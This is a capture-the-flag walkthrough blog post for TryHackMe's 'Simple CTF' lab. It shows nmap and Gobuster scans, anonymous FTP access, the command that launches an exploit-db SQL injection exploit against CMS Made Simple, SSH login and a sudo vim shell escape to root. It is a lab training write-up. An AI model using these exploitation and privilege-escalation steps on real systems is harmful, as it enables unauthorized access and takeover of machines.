---
title: "TryHackMe - Simple CTF"
author: Nasrallah
description: ""
date: 2022-01-27  00:00:00 +0000
categories : [TryHackMe]
tags: [tryhackme, linux, ftp, sqli, python, crack, sudo]
---

<div align="center"> <script src="https://tryhackme.com/badge/367641"></script> </div>

---

# **Description**

Hello l33ts, I hope you are doing well. Today we are going to look at [Simple CTF](https://tryhackme.com/room/easyctf) from [TryHackMe](https://tryhackme.com/), an easy machine where we find an outdated CMS, us an exploit for that to get ssh credentials, and finally escalate to root using Vim. If you have any questions please feel free to ask me on any of my [socials](https://nasrallahbaadi.github.io/about).

# **Enumeration**

## nmap

As always, we run a nmap scan:

```terminal
$ sudo nmap -sC -sV -p- 10.10.92.122 | tee scans/nmap
Starting Nmap 7.92 ( https://nmap.org ) at 2022-01-27 05:26 EST
Nmap scan report for 10.10.92.122
Host is up (0.11s latency).
Not shown: 65532 filtered tcp ports (no-response)
PORT     STATE SERVICE VERSION
21/tcp   open  ftp     vsftpd 3.0.3
| ftp-syst:
|   STAT:
| FTP server status:
|      Connected to ::ffff:10.11.31.131
|      Logged in as ftp
|      TYPE: ASCII
|      No session bandwidth limit
|      Session timeout in seconds is 300
|      Control connection is plain text
|      Data connections will be plain text
|      At session startup, client count was 3
|      vsFTPd 3.0.3 - secure, fast, stable
|_End of status
| ftp-anon: Anonymous FTP login allowed (FTP code 230)
|_Can't get directory listing: TIMEOUT
80/tcp   open  http    Apache httpd 2.4.18 ((Ubuntu))
| http-robots.txt: 2 disallowed entries
|_/ /openemr-5_0_1_3
|_http-title: Apache2 Ubuntu Default Page: It works
|_http-server-header: Apache/2.4.18 (Ubuntu)
2222/tcp open  ssh     OpenSSH 7.2p2 Ubuntu 4ubuntu2.8 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey:
|   2048 29:42:69:14:9e:ca:d9:17:98:8c:27:72:3a:cd:a9:23 (RSA)
|   256 9b:d1:65:07:51:08:00:61:98:de:95:ed:3a:e3:81:1c (ECDSA)
|_  256 12:65:1b:61:cf:4d:e5:75:fe:f4:e8:d4:6e:10:2a:f6 (ED25519)
Service Info: OSs: Unix, Linux; CPE: cpe:/o:linux:linux_kernel
```

We have 3 open port:
 - 21 - FTP
 - 80 - HTTP
 - 2222 - SSH

## FTP

From the nmap scan, we see that anonymous FTP login is allowed, so let's take a look:

```terminal
$ ftp 10.10.92.122                                                                                                                                   130 ⨯
Connected to 10.10.92.122.
220 (vsFTPd 3.0.3)
Name (10.10.92.122:sirius): anonymous
230 Login successful.
Remote system type is UNIX.
Using binary mode to transfer files.
ftp> ls
229 Entering Extended Passive Mode (|||44846|)
^C
receive aborted. Waiting for remote to finish abort.
ftp> passive
Passive mode: off; fallback to active mode: off.
ftp> ls
200 EPRT command successful. Consider using EPSV.
150 Here comes the directory listing.
drwxr-xr-x    2 ftp      ftp          4096 Aug 17  2019 pub
226 Directory send OK.
ftp> cd pub
250 Directory successfully changed.
ftp> ls
200 EPRT command successful. Consider using EPSV.
150 Here comes the directory listing.
-rw-r--r--    1 ftp      ftp           166 Aug 17  2019 ForMitch.txt
226 Directory send OK.
ftp> get ForMitch.txt
local: ForMitch.txt remote: ForMitch.txt
200 EPRT command successful. Consider using EPSV.
150 Opening BINARY mode data connection for ForMitch.txt (166 bytes).
100% |****************************************************************************************************************|   166        1.86 MiB/s    00:00 ETA
226 Transfer complete.
166 bytes received in 00:00 (1.64 KiB/s)
ftp>
```

>NOTE: When i tried to list the content, it gave me this "229 Entering Extended Passive Mode (|||44846|)" the way i solved was by typing `ctrl+c` and then the command `passive`.

The file we found is a note indicating that the password is so weak and can be cracked in seconds!

## HTTP

Let's now check the web server and see what's there:

![home](/assets/img/tryhackme/simplectf/home.png)

Nothing interesting, let's run a directory scan using Gobuster:

```terminal
$ gobuster dir -w /usr/share/wordlists/dirb/big.txt -u http://10.10.92.122 | tee scans/gobuster
===============================================================
Gobuster v3.1.0
by OJ Reeves (@TheColonial) & Christian Mehlmauer (@firefart)
===============================================================
[+] Url:                     http://10.10.92.122
[+] Method:                  GET
[+] Threads:                 10
[+] Wordlist:                /usr/share/wordlists/dirb/big.txt
[+] Negative Status codes:   404
[+] User Agent:              gobuster/3.1.0
[+] Timeout:                 10s
===============================================================
2022/01/27 06:07:56 Starting gobuster in directory enumeration mode
===============================================================
/.htaccess            (Status: 403) [Size: 296]
/.htpasswd            (Status: 403) [Size: 296]
/robots.txt           (Status: 200) [Size: 929]
/server-status        (Status: 403) [Size: 300]
/simple               (Status: 301) [Size: 313] [--> http://10.10.92.122/simple/]

===============================================================
```

We found **/robots.txt** file and **/simple** directory, robots file has nothing useful for us, and we find CMS Made Simple running on the machine, and it is displaying the version of it in the bottom left corner:

![version](/assets/img/tryhackme/simplectf/version.png)

We found that this version of the CMS is vulnerable to SQL injection, here is the [exploit](https://www.exploit-db.com/exploits/46635).

## SQLi

After downloading the exploit, we can launch the attack with the following command:`python <exploit>.py -u http://{target_IP}/simple/ -c -w {path/to/the/wordlist}`


```terminal

[+] Salt for password found: 1daREDACTED6bb2
[+] Username found: m___h
[+] Email found: admin@admin.com
[+] Password found: 0c01f4468REDACTEDc7eb73846e8d96
[+] Password cracked: s_____

```

> Note: I have masked the the data above, but if you run the exploit, you will get the username and the password.


# **Foothold**

Now that we have a username and password, we can try to connect to SSH

`ssh -p 2222 username@{target_IP}`

```terminal
$ ssh -p 2222 m____@10.10.92.122
m____@10.10.92.122's password:
Welcome to Ubuntu 16.04.6 LTS (GNU/Linux 4.15.0-58-generic i686)

 * Documentation:  https://help.ubuntu.com
 * Management:     https://landscape.canonical.com
 * Support:        https://ubuntu.com/advantage

0 packages can be updated.
0 updates are security updates.

Last login: Thu Jan 27 13:58:57 2022 from 10.11.31.131
$ ls
user.txt
```

Great, we got access to the machine via SSH, let's do some enumeration to see what can we find:

```terminal
$ sudo -l
User m___h may run the following commands on Machine:
    (root) NOPASSWD: /usr/bin/vim

```


# **Privilege Escalation**

With our current user, we can run `vim` as root, this is great, if we go to [GTFPBins](https://gtfobins.github.io/) we can see that there is a way to escalate our privileges to root using this command: `sudo vim -c ':!/bin/bash'` , so let's do it:

```terminal
$ sudo vim -c ':!/bin/bash'

root@Machine:~# id
uid=0(root) gid=0(root) groups=0(root)
root@Machine:~# ls /root
root.txt
```

And just like that, we got root on the machine.

I hope you guys have enjoyed this machine, see you in the next hack.
